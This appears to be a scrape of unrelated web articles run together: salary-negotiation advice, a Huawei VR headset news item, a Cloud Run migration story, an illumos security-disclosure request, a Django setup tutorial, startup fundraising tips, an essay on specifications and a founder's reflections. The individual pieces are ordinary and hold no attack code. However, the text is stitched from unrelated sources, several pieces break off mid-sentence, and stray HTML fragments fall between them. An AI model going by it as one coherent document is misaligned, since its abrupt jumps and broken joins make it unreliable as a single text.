<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: “I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p><p>Reddit has been awash with posts of people getting asked for their salary history while job hunting. These posts are popping up on all sorts of subreddits. I’ve seen folks write about it in /r/personalfinance, /r/engineering, and even a bit in /r/ECE. There has been <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">a reasonable amount of ink spilled on salary negotiation online</a>, and nearly all of the advice agrees: <em>absolutely do not disclose your salary history to a prospective employer.</em> The anchoring effect of disclosing what you’re paid now naturally ties a follow-on offer to that salary.</p><p>Sorry, I slipped into manager-speak there. Let me rephrase that, in plain English. Disclosing your salary can turn a potential double digit raise when changing jobs to a few percent raise. You could leave thousands, or even <em>tens</em> of thousands of dollars on the table.</p><p>At the time of this writing, it’s still completely legal for a prospective employer to ask for salary history in <a href="https://www.hrdive.com/news/salary-history-ban-states-list/516662/">over half of the states in the USA</a>. I’m fortunate enough to live in Massachusetts, where asking for salary history has been illegal since 2018. In theory, this question isn’t a problem for me any more. In reality, it’s just changed shapes. Like a nasty cold, the question has just mutated into a new form. Instead of asking: “What is your current salary?”, prospective employers instead ask “What’s your <em>expectation</em> around salary?”</p><p>This is completely legal, but if you’re not cagey about it, you could cheerfully volunteer too much information about yourself. No law is broken if you say: “Well, I currently make <em>X dollars per year</em>, so I’d expect that plus <em>arbitrary percentage raise</em>.” Make no mistake: once you’ve given a number, it’s all over. A recruiter only hears the salary you volunteered to them. The clearest symptom of this is receiving job offers of your current salary, plus $5k or 5%.</p><p>(<strong>Note:</strong> When I say “recruiter” here, I’m referring to a recruiter or other HR professional working in-house at a company. This advice doesn’t really apply to recruiting and placement agencies. Since agency fees are based on a percentage of your salary upon getting hired, the incentives are aligned for them to ask for more money on your behalf. When you make more, they make more. Indeed, agency recruiters can be valuable information brokers. I’ve had agency recruiters tell me, completely voluntarily, that they’ve been trying to fill the position you’re discussing for six months. That’s <em>extraordinary</em> leverage for a qualified candidate.)</p><p>This potentially leaves you with a <em>boatload</em> of money on the table. Suppose, for a moment, that your skillset is one that this company desperately needs. As a result, your skillset is likely delivering way more value to that prospective employer at the margin. This means it’s a good idea for them to <em>pay you more money</em> to do your thing for them. By telling them what you get paid now, you peg the start of negotiations to that number, and give them a <em>huge discount</em> on your <em>very valuable</em> services.</p><p>Enough rambling about negotiating, and on to some practical advice! I’ve found a great turnabout phrase for being asked your salary history, or your salary expectations. Here’s what I’ve got:</p><blockquote><p>“I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p></blockquote><p>This is an excellent response, for three reasons.</p><ol><li>It offers no information <em>at all</em> about your current compensation.</li><li>It puts the person who asked you at an informational disadvantage. It shows that your counterparty is getting closer to a “yes”. Prioritizing good mutual fit in your response telegraphs to them that you are not convinced yet. This is a better negotiating position for you: making them work to convince you gives you <em>leverage.</em></li><li>It frequently yields a response in the form of the salary range that the employer is working with. I suspect this is out of a combination of surprise at being asked, and wanting to help make a good impression with you, the candidate, after learning that they haven’t convinced you to join yet.</li></ol><p>Got any other hot tips and tricks for salary negotiation? I’d love to hear them.</p><p>Also - that link I included above to Patrick McKenzie’s <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">blog post on salary negotiation</a>? Go read it. It’s excellent, and it <em>will</em> make you more money.</p></div></div>]]>

            <p>In 2019 Huawei announced their VR Glasses, a slim form factor VR headset that could be paired to a smartphone or a PC. It was a remarkable paired down and sleek looking device, unfortunately it only had 3DoF. In their announcement late last week Huawei <a href="https://www.gizmochina.com/2020/10/19/huawei-unveils-the-vr-glass-6dof-game-set-equipped-with-a-360-degree-joystick/">unveiled their upgraded headset</a> which promises 6DoF.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Apparently this is the new 6DoF version of HUAWEI VR glass. <a href="https://t.co/JblDbVAqE7">pic.twitter.com/JblDbVAqE7</a></p>— Kevin Pan (@rereflux) <a href="https://twitter.com/rereflux/status/1318097398728589313?ref_src=twsrc%5Etfw">October 19, 2020</a></blockquote>

</figure><p>The upgrade is comparable to the shift from the Oculus Go to Oculus Quest. Three degrees of freedom (3DoF) only tracks very basic head movements, six degrees of freedom (6DoF) allows the user to fully move around in the virtual space.</p><p>The headset also comes with two 6DoF controllers that look suspiciously similar to the Oculus Touch controllers. They are able to be stacked together along with the headset for easy storage. As for the headset itself, it has not changed since the first version in 2019 save for the inclusion of two tracking cameras.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Video of said headsets controllers locking in. <a href="https://t.co/wJdX4tSeIG">pic.twitter.com/wJdX4tSeIG</a></p>— Nikk Mitchell 🛸 (@nikkmitchell) <a href="https://twitter.com/nikkmitchell/status/1318514593598107649?ref_src=twsrc%5Etfw">October 20, 2020</a></blockquote>

</figure><p>The announcement was made at the World VR Industry Conference Cloud Summit in Nanchang, China. Not a lot of info about the product was specified but we did see a few tweets from China based VR developers who attended the event. According to what little information that we have, the headset will be sent out to developers later this year and the consumer release is set to be around April 2021. The price has not been announced but last years VR Glass was priced at around $424, the improvements will certainly increase the price.</p><p>Disappointingly, it does not look like the VR Glass will see any store shelves outside of mainland China. The first iteration of the VR Glass was not made available for purchase internationally and if the sanctions against the company are anything to go by, it doesn’t look like this version will either.</p>

				<p><a href="https://fatihacet.com/">Fatih Acet</a> is the CTO and co-founder of <a href="https://superpeer.com/">Superpeer</a> and employee number 40 at GitLab.</p><p>He recently came on <a href="https://w.cto.ai/theopsshow">The Ops Show</a> to discuss how he used a serverless strategy to scale his engineering team to 17 developers.</p><p>The video below gives his entire explanation, but below I’ll break it down into steps for ease.</p><!--kg-card-begin: embed--><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/3C3buRWlEvA?start=120&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><!--kg-card-end: embed--><p>So, how to do serverless right and save money doing it. Here we go:</p><h2 id="step-1">Step 1</h2><p>Fatih describes himself as a T-shaped Frontend Engineer. That means his expertise goes deep while his collaboration goes wide. He initially wanted to use MEAN stack but then decided to go serverless. With his previous experience with AWS, he found AWS confusing and hard to manage so he decided to go with GCP. Instead of Mongo, he chose Firestore and also Cloud Function. With the first site launch, they had around 30 Cloud Functions.</p><!--kg-card-begin: image--><figure><img src="https://lh6.googleusercontent.com/D7fzfyiFckoQX6LrGCjVnnraYs2WkF6K1msWCzpWRaCPJKSHs_WEMxG1FEpgaaqcooere7EArr9KfRJumjfZAK9Vte-l3Y-pwp6pzoNXkN7an_oIw2qZZjb6ZC3nhfJOw6VqqDuu"></figure><!--kg-card-end: image--><h2 id="step-2">Step 2</h2><p>He used the Cloud Functions for the application backend. However, because of the cold starts, accepting a booking (Superpeer allows mentoring calls to be booked) was taking around 8s, 6s spent for the cold starts. A Cloud Function instance can only handle one concurrent request so a cold start was unavoidable.</p><h2 id="step-3">Step 3</h2><p>Eventually, they built up to 85 Cloud Functions and deployment became an issue, too. Cloud Function deployments are done one by one and take around 25 minutes to be completed. Application Frontend can only be deployed after all of the Cloud Function deployments are completed. However, there was an over 20-minute difference between the first and the last Cloud Function deployment.</p><h2 id="step-4">Step 4</h2><p>They started to migrate to Cloud Run. Cloud Run can handle 80 concurrent requests. Also, deployment of Cloud Run is a lot easier since it’s a containerized application deployments happen at the same time.</p><h2 id="step-5">Step 5</h2><p>Recently, Cloud Run started to allow you to keep a number of instances always-on and he set the minimum instance count to 5 and<strong> </strong>got the system down to no cold starts. The maximum number of instances is set to 1,000 to allow almost infinite scaling.</p><h2 id="step-6">Step 6</h2><p>After deployment of the Cloud Run, accepting a booking down to 300 milliseconds instead of 8 seconds with Cloud Functions. This made a huge impact on the application’s perceived performance.</p><h2 id="step-7">Step 7</h2><p>20 Cloud Functions are still remaining for async stuff. For example, resizing uploaded images or transcribing uploaded videos, and sending email. All application backend moved to Cloud Run. This is where Fatih made it to the true future of serverless.</p><!--kg-card-begin: image--><figure><img src="https://lh5.googleusercontent.com/JIWODkiOAscLYTYutCbOIpjUVjKRNoEB_eHFm_8n720ePPuoylxxEcCOWxlr3HHeOF_kwAEeIWc_ePCwHhHJmGLK-ITP5YlhrNJccqKGAkTVYX3WEDgDbipmfS03jQrvxjqySqDF"></figure><!--kg-card-end: image--><p>Fatih’s serverless approach helped him to scale his engineering team to 17 members because he didn’t need to worry about scaling the infrastructure anymore. He could be sure the system will perform as expected when doing their larger launches like what they did with ProductHunt.</p><h2 id="expenses">Expenses</h2><p>Serverless expenses are low for Superpeer right now. Last month their staging and production costs were around $200 total. The free quota offering from GCP is also very generous, he adds.</p><!--kg-card-begin: image--><figure><img src="https://lh6.googleusercontent.com/SK0_33KtsA-ZgjrIEQuzpHsBuetqRmr0bANO3XTVgg_7xNMG-IS-7wmC-X5BmIjWMT7XY7MEilYjFio8cNSK4_qR-nS_Z6ImjP4DqFq6XOB8EtuDBGNXU01AtiEcBSFYvsGjkvgw"></figure><!--kg-card-end: image--><p>So, that’s it. Fatih’s serverless approach is saving him hundreds, if not thousands, with enhanced velocity and observability.</p><p>This is the type of approach that we believe in at CTO.ai. Simple workflows that are tracked, observable, and collaborative. If you’d like to try out The Ops Platform to make your serverless journey easier, let us know by sending us a note below:</p><!--kg-card-begin: html--><!--[if lte IE 8]>

<h3>A Gentle Reminder About illumos</h3>
<p>A very bad security vulnerability in Solaris was patched-and-announced by Oracle earlier this week.  Turns out, we in open-source-descendant <a href="https://illumos.org/">illumos</a> had something in the same neighborhood. We can’t confirm it’s the same bug because reverse-engineering Oracle Solaris is off the table.</p>
<p>In general if a vulnerability is an old one in Solaris, there’s a good chance it’s also in illumos.  Alex Wilson said it best in this recent tweet:</p>

<blockquote><p lang="en" dir="ltr"><a href="https://twitter.com/anthomsec?ref_src=twsrc%5Etfw">@anthomsec</a> Hi! re: 2020-14871 (Solaris PAM bug), do you know if this was in the OpenSolaris PAM that went into illumos (<a href="https://t.co/Rxs5ct09xs">https://t.co/Rxs5ct09xs</a>) by any chance? We don't get any info via Oracle, but we do inherit their bugs if they're old enough :(</p>— Alex Wilson (@arekinath) <a href="https://twitter.com/arekinath/status/1319176485572202496?ref_src=twsrc%5Etfw">October 22, 2020</a></blockquote>  

<p>If you want to see the full history, the first 11 minutes of my <a href="https://archive.fosdem.org/2016/schedule/event/illumos_overview">talk from 2016’s FOSDEM</a> contains WHY a sufficiently old vulnerability in Solaris 10 and even Solaris 11 may also be in illumos.</p>
<p>Remember folks, Solaris is closed-source under Oracle, even though it used to be open-source during the last years of Sun’s existence.  illumos is open-source, related, but NOT the same as Solaris anymore.  Another suggested talk covers this rather well, especially if you <a href="https://www.youtube.com/watch?v=-zRN7XLCRhc&amp;t=33m">start at the right part</a>.</p>
<h3>The Actual Request</h3>
<p>Because of this history and shared heritage, if you’re a security researcher, PLEASE make sure you find <a href="https://openindiana.org/">one</a> <a href="https://omniosce.org/">of</a> <a href="https://smartos.org/">many</a> <a href="https://illumos.org/">illumos</a> distributions, install it, and try your proof-of-concept on that as well.  If  you find the same vulnerability in illumos, please report it to us via the <span>security@illumos.org</span> mailing alias.  We have a <a href="https://illumos.org/docs/security">PGP key</a> too!</p>
<p>Thank you, and please test your Solaris exploits on illumos too (and vice-versa). </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this tutorial, you would learn how to quickly install django, start a django project, and run your project on a server.</span></p>

<p><span>Django is one of the most popular open-source web development framework written in Python.</span></p>

<p><span>It is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.</span></p>

<p><span>To use django, python is required therefore you must have python installed and perhaps an ide like pycharm or Anaconda. An IDE is not mandatory but they improve your productivity.</span></p>



<div>
<p><span>Note: IDE - Integrated Development Environments - is a software application that provides comprehensive facilities to computer programmers for software development.</span></p>

<p><span>Examples of IDEs for Python is Pycharm and Anaconda</span></p>
</div>

<p><span>Though the tutorial is aimed at starting a Django project in pycharm, <span>the process is very similar in other IDEs</span>.</span></p>



<h3><span>Installing Django</span></h3>

<p><span>Start with creating a new python project in pycharm. Pycharm <span>automatically creates a virtual environment</span> for handling your packages.</span></p>

<p><span>Open the <span>terminal</span> which can be opened from the bar at the bottom of the window. It will open a command line.</span></p>

<p><span>Then run the following code to install django:</span></p>

<pre><code>pip install django</code></pre>



<p><span>This installs the django package for your project.</span></p>

<p><span>Installation of packages using pip requires an internet connection.</span></p>



<h3><span>Creating a Django Project</span></h3>

<p><span>To create a django project, go back to the terminal and run the following command:</span></p>

<pre><code>django-admin startproject myproject</code></pre>

<p><span><code>myproject</code> is the name of your Django project, you could replace it with any name.</span></p>



<p><span>After running this command, <span>Django automatically creates some new files</span>: a new directory called <span>“myproject”</span> with the basic Django directory and structures:</span></p>

<pre><code>myproject/
    myproject/
        __init__.py
        settings.py
        urls.py
        asgi.py
        wsgi.py
    manage.py</code></pre>



<p><span>These files are:</span></p>

<ul>
	<li><span>The outer <code>myproject/</code> root directory is a container for your project.</span></li>
	<li><span><code>manage.py</code>: A command-line utility that lets you interact with this Django project in various ways.</span></li>
	<li><span>The inner <code>mysite/</code> directory is the actual Python package for your project.</span></li>
	<li><span><code>myproject/__init__.py</code>: An empty file that tells Python that this directory should be considered a Python package. If you’re a Python beginner, read <a href="https://docs.python.org/3/tutorial/modules.html#tut-packages" title="(in Python v3.9)">more about packages</a> in the official Python docs.</span></li>
	<li><span><code>myproject/settings.py</code>: Settings/configuration for this Django project</span></li>
	<li><span><code>myproject/urls.py</code>: The URL declarations for this Django project; a “table of contents” of your Django-powered site.</span></li>
	<li><span><code>myproject/asgi.py</code>: An entry-point for ASGI-compatible web servers to serve your project.</span></li>
	<li><span><code>myproject/wsgi.py</code>: An entry-point for WSGI-compatible web servers to serve your project.</span></li>
</ul>



<p><span>You should not worry about understanding what these files are.</span></p>



<h3><span>Running a Django project</span></h3>

<p><span>Now that we have created a Django project we can open it in a browser. Django comes with a built-in web server for development.</span></p>

<p><span>Navigate to the Base directory where <code>manage.py</code> is by running the following command in the terminal.</span></p>

<pre><code>cd myproject</code></pre>

<p><span>Then run the command below</span></p>

<pre><code>python manage.py runserver</code></pre>

<p><span>After this command runs successfully, it would give you a link to access your Django project<code> http://127.0.0.1:8000/ </code><span>open this link in a browser. </span></span></p>



<p><span>If everything went right you should see the default page of Django.</span></p>

<p><img alt="" src="https://www.pythonstacks.com/media/uploads/2020/10/26/screenshot_2020-10-26-django-the-web-framework-for-perfectionists-with-deadlines.png"></p>



<p><span>To stop the server press <code>ctrl + c</code> in the terminal window.</span></p>



<p><span>There is more after creating a Django project.</span> <span>Enter your email in the subscription box</span> <span>to get notified of new tutorials.</span></p>

October 26, 2020 | https://danielscocco.com/tips-to-get-investment-startup-in-the-us/ | <a href="https://web.archive.org/web/*/https://danielscocco.com/tips-to-get-investment-startup-in-the-us/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost"><div itemprop="text"><p>In May 2019 we launched <a href="https://azpop.com.br/">AZpop</a>, a mobile app that works like Yellow Pages for WhatsApp (starting with the Brazilian market). Despite not being in the US, we managed to close a pre-Seed investment round with two Silicon Valley funds (<a href="https://weekend.fund/">Weekend Fund</a> and <a href="https://www.hustlefund.vc/">Hustle Fund</a>) and with some high-profile US angel investors (e.g, James Beshara who sold Tilt to Airbnb, Nick Candito who sold Progressly to Box, Dan Teran who sold Q to WeWork, and  Moshe Lifshitz from Basement Fund). Our startup was also one of the 3 (out of 500 applicants) to be selected for the <a href="https://chapterone.vc/product-club/">Product Club</a> acceleration program.</p>
<p>Below you will find the many mistakes and learnings from our fundraising process.</p>
<p><strong>1. Do not underestimate the power of simplicity</strong></p>
<p>It is quite rare for Brazilian startups to raise money from US investors; especially very early stage startups like ours. My cofounder and I have a strong belief that part of the reason why we managed to do that is the simplicity of our product, business model and pitch. When we tell investors we are building “the Yellow Pages for WhatsApp” most will immediately understand and get intrigued by the concept.</p>
<p>The simplicity factor is especially important if you cannot rely on introductions and are trying to raise money from people you don’t know. That is because you will probably have five seconds to get your idea across, and if it is something complex you will lose the attention of the investor before he has a chance to understand the concept.</p>
<p><strong>2. During calls, be as concise as possible</strong></p>
<p>Giving clear and concise answers to investors’ questions is one of the best things you can do. First because it demonstrates you know what you’re talking about (as someone with wishy-washy grasp on some topic will not be able to give clear and concise answers about it). Second, by keeping it short you avoid talking about stuff you might find important/relevant but that the investor does not. Let him guide the conversation. I always regretted when I rambled during calls with investors.</p>
<p><strong>3. Make sure your interests are aligned with your investors</strong></p>
<p>Reflect and make sure that this is the path you want to follow. If your goal is to maintain total control of your business and have sustainable growth, perhaps getting investment from venture capital funds and angel investors is not the best idea. Professional investors and VCs operate under a dynamic where 95% of the invested companies will fail, so the other 5% needs to generate the return of the entire fund. In other words, they are looking for companies that want to grow huge and want to get there quickly, almost operating under the “make or break” mentality. If that is not your vision, sooner or later it will become a conflict between you and your investors. In addition, once you start the external fundraising cycle, it is difficult to stop, as the company’s growth dynamics begin to depend on it.</p>
<p><strong>4. Stick to the best practices</strong></p>
<p>The closer you can stick to the best practices, the better. This is valid for your pitch deck, your valuation, where your company is incorporated (more on this below), the investment contracts and clauses you use and so on. Fundraising in the US is a well oiled machine so go with the flow.</p>
<p>At one occasion we were negotiating with a fund that wanted to include a clause to have the option to invest more money within the next 18 months, which is an unusual clause for early-stage investments. It created a lot of problems with the other investors (who were already in) and eventually it killed the deal.</p>
<p><strong>5. Seek investors from all regions and countries</strong></p>
<p>Perhaps our greatest insight was to not limit ourselves to seeking investment in Brazil. If we had done that, we would have raised less money, with a lower valuation, and it would have taken much longer.</p>
<p>Even if your product is not easy or ready to expand internationally, foreign investors may be interested due to the size or characteristics of your local market.</p>
<p><strong>6. Silicon Valley still rules</strong></p>
<p>The amount of money available and the propensity to place riskier bets are still orders of magnitude higher in Silicon Valley than practically in any other region or country in the world. That is why it may be worthwhile to focus your efforts there.</p>
<p>My thesis, at the beginning of the process, was that we would have the same difficulty raising R$100,000 in Brazil (equivalent to $20,000) and $100,000 in the United States. This was pretty much spot on.</p>
<p>Just to give you an idea, we closed the deal with one of our investors in the very first phone call. After 30 minutes or so of conversation he was like “Okay, I like what I hear, let’s do it!”. This would never happen outside Silicon Valley.</p>
<p><strong>7. The pandemic removed many barriers</strong></p>
<p>Many funds and investors had the rule  get to know in person the companies and their founders before closing a deal. With the pandemic this has changed, and almost everyone is now willing to talk and close investment deals remotely. It is a brave new world; embrace it and take the opportunities that were created!</p>
<p><strong>8. Delaware C Corp is a must</strong></p>
<p>In order to attract investment from any fund or professional investor in the United States you will need to open a C Corp in Delaware. This is the default. Any other type of structure, such as an LLC, or incorporating in any other state will make closing the deal much harder.</p>
<p>Fortunately, it is relatively quick and inexpensive for you to incorporate there even if you are outside the US. We used Stripe Atlas, which costs $500 and completes the process in a couple of days.</p>
<p><strong>9. Getting your EIN might be problematic (and a possible solution)</strong></p>
<p>The EIN (Employer Identification Number) is the tax ID of your company at federal level. As far as I know it is impossible to open a business bank account in the US without an EIN, so you can see how this id is going to be very important for you to finish the fundraising process!</p>
<p>My guess is that before the pandemic the issuance of EINs was relatively fast, but after coronavirus the IRS started taking longer and longer times (according to Stripe more than six weeks in some cases).</p>
<p>If someone in your team has a Social Security Number he might be able to request the EIN on behalf of the company and get it within one day or so, even during the pandemic. Even if no one in your team does it might be possible to hire a lawyer as a General Counsel for the company and he might be able to request the EIN for you.</p>
<p><strong>10. Understand how it will affect your local tax obligations</strong></p>
<p>For most startups the United States operation will become the controller of the local operation in your country (if you are located outside the US, that is). Make sure you understand all the ramifications of this change will have on your tax obligations.</p>
<p><strong>11. Get a lawyer when issuing stock</strong></p>
<p>Stripe Atlas has a tool you can use to issue stock to the founders. I was tempted to use it to save money, but decided to hire an attorney to oversee the process for us. It was $300 very well spent! If we had done it ourselves we would have made a bunch of mistakes that could become larger problems down the road. Pay particular attention to filing form 83(b) if needed in your case.</p>
<p><strong>12. Get ready to have vesting</strong></p>
<p>If initially you formed an LLC or if you incorporated outside the US you probably already had access to 100% of your shares or quotas. By migrating to a Delaware C Corp. you will get vesting on all your shares. The usual term is 4-year vesting with 1-year cliff. This is obviously to protect investors from having you walk away from the company with all your shares, which I believe is fair.</p>
<p>One point you might be able to negotiate is the commencement period or the vesting. You might be able to adjust that to the actual start of the company rather than the date it was incorporated in the US.</p>
<p><strong>13. Get ready to have double acceleration</strong></p>
<p>Single acceleration: If the company is sold all shares that are still in vesting accelerate (i.e. become available to you immediately)<br>
Double acceleration: the company needs to be sold and you need to be fired for the acceleration of vesting to occur</p>
<p>Another standard clause is “double acceleration” for vesting, so get ready to have one in your stock purchase agreement. This means that even if your company is bought, your shares will not be converted automatically. You will need to continue working for the acquiring company until the end of your vesting contract. Only if the acquiring company fires you that your shares accelerate.</p>
<p>It is not a very encouraging clause for the founders but it is important to increase the probability of attracting new investors in the future, as it makes your startup more appealing to potential acquirers.</p>
<p><strong>14. Cold emails do work (if you work at them)</strong></p>
<p>I have always heard that the only way to reach investment funds was through introductions from people they already thrust. I ignored this information and sent an e-mail to the funds that interested us, using the form or e-mail from the same website, and to our surprise the majority responded.</p>
<p>Obviously the email needs to be good, so spend some time on it. I would recommend customizing it for each fund and investor, crafting a very catchy subject line and being very succinct and direct in the body of the email so that you present all the relevant metrics and let the investor decide whether or not he wants to hear more.</p>
<p><strong>15. It is a numbers game (initially)</strong></p>
<p>If you send out five emails you will probably not get any replies, regardless of how good your subject line and email content are. You will need to send out hundreds of emails to start getting some replies. Too much work you say? Then perhaps fundraising is not for you!</p>
<p><strong>16. Leverage the first connections</strong></p>
<p>After you get some replies to your cold emails you can start asking for introductions to other investors or funds that the person believes might be a good fit for your startup. If your project is interesting and has potential this will work very well because by introducing you to the other potential investors the person will gain some karma, …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>Specifications work in two ways: they inform developers what needs to be built, and they constrain the problem space so that tasks become approachable.</p>

<p>Without clear specifications, developers may build the wrong software, or they may take too long building more software than the customers actually need.</p>

<p>On the other hand, specifications which include too much detail can be damaging to the software’s architecture and the program’s usability. When specifications include too much detail, they constrain the problem space in such a way as to limit the user’s actions unnecessarily. Excessive detail also requires programmers to handle edge-cases in complicated ways, often adding unnecessary indirections, which make the program’s execution flow more complex, and thus harder to debug.</p>

<p>Imagine you’re implementing an operating system, for example. If specifications for its filesystem describe which actions users would like to perform, programmers can create elegant abstractions to solve the problem. On the other hand, if specifications include too many edge-cases, the system becomes inflexible and limits user interaction. Additionally, it’s harder to create non-<a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/">leaky abstractions</a>.</p>

<p><strong>Good specification is short and concise and needs to be complemented by giving developers the necessary amount of context about who the software’s users are and what these users want.</strong></p>

<p>In general, the more developers distance themselves from users, the more difficult it becomes to build software which fulfils those users’ needs.</p>

<p>If you look at companies like <a href="https://stripe.com/">Stripe</a>, for example, you’ll see that their engineers deeply care about their users, and are kept close to them. That’s why Stripe’s built such a brilliant product.</p>

<p>Keeping developers close to users means that, given a minimal amount of specification, those developers can figure out what are the boundaries of what they need to build.</p>

<p>Instead of describing every minimal detail and edge-case, <strong>good specification focuses on intents and outcomes</strong>. It relies on the developer to think about possible edge-cases and empower their users with flexible functionality, which usually leads to software that’s more elegant and useful.</p>

<p>Additionally, outcome-focused specifications reduce communication overhead between product and software development teams. Instead of having to ask product about every single edge-case, this kind of specification empowers developers to think about what’s best for the user.</p>

<p>However, depending on what developers will build, they may need specifications which go beyond intents and outcomes.</p>

<p>When developing, back-end services, for example, text-based stories are enough. On the other hand, developers working on front-end applications need designs so that they can build pleasant experiences, and schema definitions so that they can interface with data-provider services.</p>

<p>That’s why I’d recommend teams to use tools like <a href="https://zeplin.io/">Zeplin</a> or <a href="https://figma.com/">Figma</a> to smoothen design handover, or <a href="https://mockoon.com/">mock-api tools like Mockoon</a> (whose tutorials are available <a href="https://mockoon.com/tutorials/">here</a>) to smoothen the development process of applications which fetch data from a RESTful API.</p>

<p>Useful and elegant software understands their users and is <a href="https://www.youtube.com/watch?v=pMuiVlnGqjk">built upon their language</a>, not on a vacuum.</p>

<p>All code needs a purpose.</p>





<p>This post’s title is a reference to Tolstoy’s <a href="https://www.goodreads.com/book/show/21206786-how-much-land-does-a-man-need"><em>“How much land does a man need?”</em></a>.</p>

	mean-bean is still in its infancy, with the brand in its current shape less than three months old- still shifting, changing and hustling-, but I am one week away from closing in on four months of being a founder.     </p>

        <p>
	In the past weeks I spoke more and more to baby founders- I can call them that now, I’m a goddamn veteran- and as I unconsciously started becoming a pseudo-mentor to them, I started realizing what a journey these past four months have been, how much I’ve learnt and how much I can already share with those around me. I’ve made plenty of rookie mistakes, it’s been a rollercoaster- and this is why, just one step ahead from being a complete beginner, I feel like it is my duty to share what I’ve learnt so far.     </p>

	Coming from a completely non-startup environment- I’m a fluffy artistic minded academic, with passions ranging so heavily on the spectrum no one else understands how things click in my mind at all times- becoming a part of this has been challenging. I would say that starting out on this path during Covid-times is both a blessing and a curse: it’s allowed me to speak to people all the way across the world since day 0, but it also means my startup experience is extremely isolating. I didn’t have industry connections, or startup connections, or friends that went on this path, I didn’t have anyone to share this with. I found myself alone with a laptop and an entire world out there, trying to figure out where to even start.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	Getting started is a hustle. But here’s what I figured out so far:     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	1. The discovery phase never ends     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	I spent the first month just talking to people- learning how to listen, how to be a fly on the wall in someone else’s story. I spoke to dozens of people, and at the end of the month, I knew what to build- or so I thought. What I’m building changed a bunch of times since, and that is because discovery never ended. I had taken a tech break for the second month, but after that, I’ve been speaking consistently to people on a weekly basis- at least four to five interviews, informal chats, never-ending slack, reddit, product hunt, indie hackers, every-platform-on-planet-earth chatting. People will guide you at every stage- and in a startup, there’s a heck load of guiding, it all changes weekly.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->

<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	join founder and product management slack communities, stalk people on Linkedin, look into the circles where your potential customers spend their online time, and converse- don’t market, don’t try to sell, don’t ask people if you want what you’re selling. Just speak, and listen to people’s problems- everyone wants to share their problems.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	2. Founder besties are the only reason you’re still sane     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	Find them- find your founder besties, because this is not a road you want to go down alone. I am only now entering a stage where I’m looking for formal support systems (mentors, funding, experts etc). I wouldn’t have made it through my first four months without these guys- you know who you are. We’re progressing through stages together, we’ve had our five thousand mental breakdowns together, and hell I appreciate their values and what they’re building, and the fact that I believe in them and they believe in me is the only thing that’s kept me going. These informal connections are vital- they’re closer to who you are, who you want to be and what you’re outpouring into this new company you’re bringing into the world.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->

<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	YC startup school is a good place to look for besties.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	3. Your job as a founder is to inspire, full period.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	It’s been a rollercoaster, as I said. As an interdisciplinary, half-techie, half-hell-knows-everything-else founder, it took me… well, four months to find my voice. It is easy to get sidetracked, easy to get stuck into building tech, easy to stop believing in yourself. It is hard to accept your limits, to see your golden-sparkly-shining strengths, to picture how exactly are you going to build a new world. It is hard to rip your chest open and put yourself out there- the hardest. 
    </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	Once you go down this path, you are the brand. And whilst there are so many things you can do, want to do or know how to do (heck yeah I can spend 3 years and bring a consumer electronics product to market on my own), your most important job as a founder is to inspire- to open up your heart and mind to the world, and let energy outpour from you; to make connections, to spread ideas, to fiercely drive the mission of your startup into the world. You cannot do this alone- and you shouldn’t. Your job is to bring this to the world, and let the world snowball this seed you’ve planted into something you cannot even imagine.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	Make people believe in you- no one cares about your product, or about your cool tech. But they care about you, on a human, raw and personal level. People invest in people- you need to spark their creativity, make them feel. This is your job as a founder. You’ll get to do everything else, but they come second.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	Yes, I am still learning how to master this and own myself- we grow into our own shoes along our brand.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->

<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	don’t build tech when you just start- can you show a pretty picture of tech? What you need is market validation, traction, a brand, identity, support. Focus on people. People are your full time job.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->

<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	Once you go down the rabbit hole, you must leave shame and fears behind. You’re alone, sans a support system- ae, no school or established institution, or anything of the formal kind, especially in your first months- you’re out in deep waters and you need to learn how to swim. You’re going to have to elbow your way into the current system so- you guessed it- so you can change and disrupt it from bottom up. You need to create your own world-  literally from scratch. From where there was just a kid dreaming of changing the world someday, now you’re here, and doing it, with no prior foundation and with no help. 
So when this happens, you cannot have any shame anymore- it is up to you, whatever happens from now on, it is on you and you alone. You’ll have to test multiple leads, ecosystems, ways of addressing people- you’ll have to iterate a lot, you’ll have to make big splashes, make a lot of noise, but also know when to be quiet and listen, you’ll have to change, but you’ll also have to know when to stand your ground fiercely; you’ll have to be patient, but you’ll also need to know when to jump. You’ll have to put yourself out there without flinching. 
    </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
